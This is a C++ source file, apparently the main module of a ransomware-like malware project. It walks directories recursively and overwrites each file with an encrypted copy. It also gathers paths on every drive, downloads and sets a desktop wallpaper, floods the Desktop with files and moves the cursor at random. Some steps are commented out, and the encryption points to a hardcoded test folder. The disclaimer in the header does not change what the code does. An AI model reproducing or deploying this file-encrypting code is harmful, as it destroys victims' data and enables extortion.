/*
	 AUTHOR: Rocka
	 GITHUB: https://www.github.com/rockadev

	 Author of this project is not responsible for any damage that someone make.
*/

#include "main.h"
#include "utils.h"
#include "files.h"
#include "rand.h"
#include "registers.h"

#pragma warning(disable:4101)
#pragma warning(disable:4390)
#pragma warning(disable:4244)

using namespace std::filesystem;
using namespace crypt;

void utils::Background::ch_process(const wchar_t* background)
{
	int success = URLDownloadToFileW(NULL, BGURL, BGPATH, 0, NULL);
	return;
}

void utils::Background::ch_proceed(const wchar_t* backgroundpathdata)
{
	backgroundpathdata = pathappdata;
	uint_32 returnVal = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID*)backgroundpathdata, SPIF_UPDATEINIFILE);
	return;
}


void ::Encryption::encrypt(std::string path)
{
	auto iter = directory_iterator(path, SKIP_PERMS_IF_DENIED);
	auto end_iter = end(iter);
	auto errorcode = std::error_code();

	for (; iter != end_iter; iter.increment(errorcode))
	{
		if (errorcode)
		{
			continue;
		}

		for (const auto& entry : iter)

		{
			try
			{

				if (entry.is_directory())
				{
					encrypt(entry.path().string());
				}
				else
				{
					int str_length = 80;
					int nm = str_length;

					std::cout << "Current file: " << entry.path().string() << std::endl;

					fps.open(entry.path().string().c_str(), std::fstream::in | std::ios::binary);
					fpt.open("C:\\Users\\mineo\\Desktop\\kkt\\tmp.txt", std::fstream::out | std::ios::binary);

					while (fps >> std::noskipws >> character)
					{
						fpt << _Tfilenc();
					}

					fps.close();
					fpt.close();

					fps.open(entry.path().string().c_str(), std::fstream::out | std::ios::binary);
					fpt.open("C:\\Users\\mineo\\Desktop\\kkt\\tmp.txt", std::fstream::in | std::ios::binary);


					while (fpt >> std::noskipws >> character)
					{
						fps << character;
					}

					fps.close();
					fpt.close();

					//rename(entry.path().string(), rename_suffix(entry.path().string()));
				}
			}
			catch (filesystem_error& e)
			{
				// Ignore the error
			}
		}
	}
}

void ::Spam::desktop()
{
	for (int32 files = 0; files < MAX_FILES; files++)
	{
		std::wstring filecount = std::to_wstring(files);
		std::wstring shit = L"C:\\Users\\mineo\\Desktop\\kkt\\" + fname + filecount + ftype;
		std::wofstream outfile(shit.c_str());
		outfile << fcontent;
	}
}

void * CursorMovement(int miliseconds)
{
	for (int i = 0; i < TIMES; i++, Sleep(miliseconds))
	{
		SetCursorPos(50 + rand() % 800, 50 + rand() % 800);
	}
	return 0;
}

int main(int argc, char * argv[])
{
	::Spam * spamfiles = new ::Spam();
	//utils::Background * changeBg = new utils::Background();
	utils::ListDrives * listdrives = new utils::ListDrives();
	crypt::Encryption * encryptFiles = new crypt::Encryption();

																// Registry changes need to be the first function to run.
	//changeBg->ch_process(pathappdata);						// Bg download needs to be second.
	encryptFiles->suffix = L"DDNT&&OBPA=D";						// After encryption rename files.

	//spamfiles->desktop();										// Spam files on desktop.
	Reg::Regs * mainreg = new Reg::Regs();
	//mainreg->mainRegedit();
	//CursorMovement(50);

	std::vector<std::string> drives = listdrives->getListOfDrives();
	std::vector<std::string> driveslist;
	
	for (std::string currentDrive : drives) {
		if (currentDrive[0] == 'C')
		{
			driveslist.push_back(currentDrive + "\\Users\\\\" + std::string(user) + "\\\\Desktop\\\\");
		}

		else
		{
			driveslist.push_back(currentDrive + "\\");
		}
	}


	int32 drive = 0;

	for (drive; drive < driveslist.size(); drive++)
	{
		try
		{
			encryptFiles->encrypt("C:\\Users\\mineo\\Desktop\\kkt\\");
		}
		catch (filesystem_error &e)
		{
			// Ignore errors
		}
	}

	return 0;
}
